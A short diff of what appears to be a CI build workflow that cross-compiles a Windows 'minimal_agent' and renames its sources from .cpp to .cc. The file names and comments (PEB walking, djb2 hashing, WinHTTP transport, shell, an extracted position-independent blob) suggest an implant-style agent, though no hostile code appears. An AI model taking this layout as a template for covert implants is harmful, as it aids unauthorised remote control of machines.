@@ -85,7 +85,7 @@ jobs:
           EXE=minimal_agent.exe
           BIN=minimal_agent.bin
           echo "=== building windows-${{ matrix.arch }}-${{ matrix.flavor }} (${{ matrix.triple }}-g++) ==="
-          # entry.cpp MUST stay FIRST on the command line and carries only
+          # entry.cc MUST stay FIRST on the command line and carries only
           # entry(). Merge
           # read-only log/string data into .text so the extracted blob
           # contains every RIP-relative target it uses. llvm-mingw uses lld,
@@ -97,11 +97,11 @@ jobs:
               -DID_BUILD_NUMBER="$BUILD_NUMBER" \
               -DAGENT_COMMIT_HASH="\"$COMMIT_HASH\"" \
               -c \
-              entry.cpp src/picfixup.cpp src/main.cpp \
-              src/transport.cpp src/shell.cpp src/system_facts.cpp \
-              src/environment.cpp src/winhttp_api.cpp src/ntdll.cpp src/kernel32.cpp \
-              src/advapi.cpp src/string.cpp src/memory.cpp src/peb.cpp \
-              src/system.cpp src/djb2.cpp src/logger.cpp src/commands.cpp
+              entry.cc src/picfixup.cc src/main.cc \
+              src/transport.cc src/shell.cc src/system_facts.cc \
+              src/environment.cc src/winhttp_api.cc src/ntdll.cc src/kernel32.cc \
+              src/advapi.cc src/string.cc src/memory.cc src/peb.cc \
+              src/system.cc src/djb2.cc src/logger.cc src/commands.cc
             mv ./*.o obj/
             objects=(obj/entry.o)
             for object in obj/*.o; do
